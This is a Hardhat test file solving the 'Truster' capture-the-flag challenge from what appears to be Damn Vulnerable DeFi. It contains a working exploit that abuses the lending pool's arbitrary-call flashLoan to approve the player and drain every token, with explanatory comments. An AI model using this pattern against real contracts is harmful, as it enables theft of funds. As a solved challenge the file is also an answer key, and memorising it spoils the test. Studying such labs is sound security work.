const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /**
         * The test is designed to exploit the vulnerability in the `TrusterLenderPool` contract,
         * specifically the arbitrary function call allowed within the `flashLoan` function.
         * 
         * The key vulnerability is that the `flashLoan` function allows the borrower to specify
         * a `target` contract and arbitrary `data` that gets executed on behalf of the pool contract.
         * This opens the door for an attacker to perform unauthorized actions, such as approving
         * token transfers from the pool's balance.
         */
    
        // Create an interface to interact with the `approve` function of the DamnValuableToken contract.
        let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
    
        // Encode the data to call `approve` with the player's address as the spender and the entire pool balance as the amount.
        // This will allow the player to transfer all tokens from the pool to their own address.
        let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
    
        /**
         * The attacker initiates a flash loan with a `0` amount.
         * - The `target` contract is the DamnValuableToken contract.
         * - The `data` passed is the encoded `approve` call.
         * 
         * Even though the loan amount is `0`, the `flashLoan` function still performs the arbitrary
         * call to the `approve` function, allowing the attacker to gain approval to transfer the entire
         * token balance from the pool.
         */
        await pool.connect(player).flashLoan(0, player.address, token.address, data);
    
        /**
         * After the `flashLoan` execution:
         * - The player's address now has approval to spend the entire token balance of the pool.
         * 
         * The attacker (player) can now transfer all the tokens from the pool to their own address
         * using the `transferFrom` function.
         * 
         * This is the actual draining step, where all tokens are moved out of the pool to the attacker's address.
         */
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    
        /**
         * Summary of the attack:
         * - **Vulnerability:** The `flashLoan` function allows arbitrary calls to be made on behalf of the pool.
         * - **Exploit:** The attacker used this to approve themselves to spend all of the pool's tokens.
         * - **Result:** The attacker then drained all the funds from the pool by transferring the tokens to their own address.
         */
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

